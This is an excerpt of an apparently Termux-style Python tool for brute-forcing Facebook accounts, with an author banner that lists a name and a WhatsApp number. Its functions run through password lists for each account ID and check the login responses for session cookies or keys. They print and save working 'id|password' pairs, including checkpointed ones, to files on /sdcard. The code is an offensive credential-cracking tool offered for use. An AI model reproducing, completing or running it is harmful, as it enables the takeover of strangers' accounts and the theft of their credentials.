...
----------------------------------------------
 AUTOR             : BILAL AHMED SHEIKH
 WHATSAPP     : 03190857715
 VERISON          :0.4
 FRIEND             :WAQAR
 BROTHER         :ADIL
----------------------------------------------
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [HASHIM-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SATAN:
                                ...
                                print('\r\r\033[1;32m [HASHIM-OK] %s | %s'%(ids,pas))
                                ...
                                if 'y' in pcp:
                                        ...
                                        open('/sdcard/HASHIM-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [HASHIM-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HASHIM-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;93m [HASHIM-CP] '+ids+' | '+pas+'\x1b[1;93m')
                                                open('/sdcard/HASHIM-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        open('/sdcard/BHS-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;93m [BHS-CP] '+ids+' | '+pas+'\x1b[1;93m')
                                                open('/sdcard/BHS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/BHS-CP.txt','a').write(ids+'|'+pas+'\n')
